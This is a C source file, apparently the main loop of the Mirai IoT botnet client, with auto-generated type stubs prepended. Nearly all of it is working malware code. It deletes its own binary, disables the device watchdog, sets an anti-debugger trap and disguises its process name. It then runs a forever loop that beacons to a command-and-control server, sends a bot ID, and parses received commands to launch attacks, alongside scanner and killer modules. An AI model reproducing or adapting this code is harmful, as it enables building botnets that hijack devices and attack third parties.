#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  char uint8_t ;
typedef  int uint16_t ;
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct sigaction {void* sa_sigaction; int /*<<< orphan*/  sa_mask; void* sa_flags; } ;
typedef  int socklen_t ;
typedef  int /*<<< orphan*/  sigset_t ;
typedef  int /*<<< orphan*/  rdbuf ;
typedef  int /*<<< orphan*/  len ;
typedef  int /*<<< orphan*/  id_len ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  err ;
typedef  int /*<<< orphan*/  cli_addr ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct TYPE_4__ {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int EAGAIN ; 
 int EINTR ; 
 int EWOULDBLOCK ; 
 int /*<<< orphan*/  FAKE_CNC_ADDR ; 
 int /*<<< orphan*/  FAKE_CNC_PORT ; 
 scalar_t__ FALSE ; 
 scalar_t__ FD_ISSET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_SET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_ZERO (int /*<<< orphan*/ *) ; 
 int LOCAL_ADDR ; 
 int MSG_NOSIGNAL ; 
 int MSG_PEEK ; 
 int /*<<< orphan*/  PR_SET_NAME ; 
 void* SA_SIGINFO ; 
 int /*<<< orphan*/  SIGBUS ; 
 int /*<<< orphan*/  SIGCHLD ; 
 int /*<<< orphan*/  SIGINT ; 
 int /*<<< orphan*/  SIGSEGV ; 
 int /*<<< orphan*/  SIGTRAP ; 
 int /*<<< orphan*/  SIG_BLOCK ; 
 int /*<<< orphan*/  SIG_IGN (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_ERROR ; 
 int STDERR ; 
 int STDIN ; 
 int STDOUT ; 
 int /*<<< orphan*/  TABLE_EXEC_SUCCESS ; 
 scalar_t__ TRUE ; 
 int /*<<< orphan*/  accept (int,struct sockaddr*,int*) ; 
 int /*<<< orphan*/  anti_gdb_entry (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  attack_init () ; 
 int /*<<< orphan*/  attack_kill_all () ; 
 int /*<<< orphan*/  attack_parse (char*,int) ; 
 int /*<<< orphan*/  chdir (char*) ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  ensure_single_instance () ; 
 int errno ; 
 int /*<<< orphan*/  establish_connection () ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int fd_ctrl ; 
 int fd_serv ; 
 scalar_t__ fork () ; 
 int /*<<< orphan*/  getsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int*) ; 
 int /*<<< orphan*/  htons (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  ioctl (int,int,int*) ; 
 int /*<<< orphan*/  kill (int,int) ; 
 int /*<<< orphan*/  killer_init () ; 
 int /*<<< orphan*/  killer_kill () ; 
 int ntohs (int) ; 
 int open (char*,int) ; 
 scalar_t__ pending_connection ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  prctl (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  raise (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  rand_alphastr (char*,int) ; 
 int /*<<< orphan*/  rand_init () ; 
 int rand_next () ; 
 int recv (int,...) ; 
 int /*<<< orphan*/  scanner_init () ; 
 int /*<<< orphan*/  scanner_kill () ; 
 void* segv_handler ; 
 int select (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int /*<<< orphan*/  send (int,...) ; 
 int setsid () ; 
 int sigaction (int /*<<< orphan*/ ,struct sigaction*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  sigaddset (int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sigemptyset (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  signal (int /*<<< orphan*/ ,int /*<<< orphan*/  (*) (int /*<<< orphan*/ )) ; 
 int /*<<< orphan*/  sigprocmask (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  sleep (int) ; 
 TYPE_2__ srv_addr ; 
 int /*<<< orphan*/  table_lock_val (int /*<<< orphan*/ ) ; 
 char* table_retrieve_val (int /*<<< orphan*/ ,int*) ; 
 int /*<<< orphan*/  table_unlock_val (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  teardown_connection () ; 
 int /*<<< orphan*/  unlink (char*) ; 
 scalar_t__ unlock_tbl_if_nodebug (char*) ; 
 int util_local_addr () ; 
 int /*<<< orphan*/  util_strcpy (char*,char*) ; 
 int util_strlen (char*) ; 
 int /*<<< orphan*/  util_zero (char*,int) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    int wfd;

    // Delete self
    unlink(args[0]);

    // Signal based control flow
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);

    // Prevent watchdog from rebooting device
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir("/");
#endif

#ifdef DEBUG
    printf("DEBUG MODE YO\n");

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    if (unlock_tbl_if_nodebug(args[0]))
        raise(SIGTRAP);
#endif

    ensure_single_instance();

    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    // Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    // Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
    killer_init();
#ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init();
#endif
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif
#ifdef MIRAI_TELNET
            scanner_kill();
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[main] Timed out while connecting to CNC\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] Error while connecting to CNC code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }
            
            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("[main] Received %d bytes from CNC\n", len);
#endif

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}